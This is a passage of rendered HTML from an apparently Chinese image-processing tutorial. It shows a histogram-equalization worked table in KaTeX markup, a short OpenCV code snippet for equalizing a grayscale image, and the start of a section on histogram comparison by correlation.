style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.808712em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.50732em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></th><th><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mi>S</mi></msub><mo stretchy="false">(</mo><msub><mi>s</mi><mi>k</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_S(s_k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></th></tr></thead><tbody><tr><td>0</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>0</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{0}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td>790</td><td>0.19</td><td>0.19-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">s_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td>0.19</td></tr><tr><td>1</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td>1023</td><td>0.25</td><td>0.44-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>3</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">s_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td>0.25</td></tr><tr><td>2</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>2</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{2}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td>850</td><td>0.21</td><td>0.65-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>5</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{5}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td>0.21</td></tr><tr><td>3</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>3</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td>656</td><td>0.16</td><td>0.81-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>6</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{6}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">s_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td>0.24</td></tr><tr><td>4</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>4</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{4}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td>329</td><td>0.08</td><td>0.89-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>6</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{6}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">s_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td>0.24</td></tr><tr><td>5</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>5</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{5}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td>245</td><td>0.06</td><td>0.95-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>7</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{7}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">s_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td>0.11</td></tr><tr><td>6</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>6</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{6}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td>122</td><td>0.03</td><td>0.98-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>7</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{7}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">s_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td>0.11</td></tr><tr><td>7</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>7</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{7}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td>81</td><td>0.02</td><td>1.0-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>7</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{7}{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>-&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>s</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">s_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td>0.11</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src = imread(<span class="string">&quot;./1.jpg&quot;</span>,IMREAD_GRAYSCALE),gray,dst;</span><br><span class="line">cvtColor(src,gray,COLOR_BGR2GRAY);</span><br><span class="line">imshow(<span class="string">&quot;gray&quot;</span>,gray);</span><br><span class="line">equalizeHist(gray,dst);</span><br><span class="line">imshow(<span class="string">&quot;hist&quot;</span>,dst);</span><br></pre></td></tr></table></figure><h2 id="直方图比较"><a class="markdownIt-Anchor" href="#直方图比较"></a> 直方图比较</h2><ul><li><p>直方图比较可以评价两幅图的直方图分布的相似性。</p></li><li><p>相关性</p></li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><munder><mo>∑</mo><mi>I</mi></munder><mrow><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">)</mo><mo>−</mo><msub><mover accent="true"><mi>H</mi><mo>^</mo></mover><mn>1</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">)</mo><mo>−</mo><msub><mover accent="true"><mi>H</mi><mo>^</mo></mover><mn>2</mn></msub><mo stretchy="false">)</mo></mrow></mrow><msqrt><mrow><munder><mo>∑</mo><mi>I</mi></munder><mrow><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">)</mo><mo>−</mo><msub><mover accent="true"><mi>H</mi><mo>^</mo></mover><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><munder><mo>∑</mo><mi>I</mi></munder><mrow><mo stretchy="false">(</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">)</mo><mo>−</mo><msub><mover accent="true"><mi>H</mi><mo>^</mo></mover><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mrow></msqrt></mfrac></mrow><annotation encoding="application/x-tex">d(H_1,H_2)=\frac{\sum_I{(H_1(I)-\hat{H}_1)(H_2(I)-\hat{H}_2)}}{\sqrt{\sum_I{(H_1(I)-\hat{H}_1)^2}\sum_I{(H_2(I)-\hat{H}_2)^2}}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span 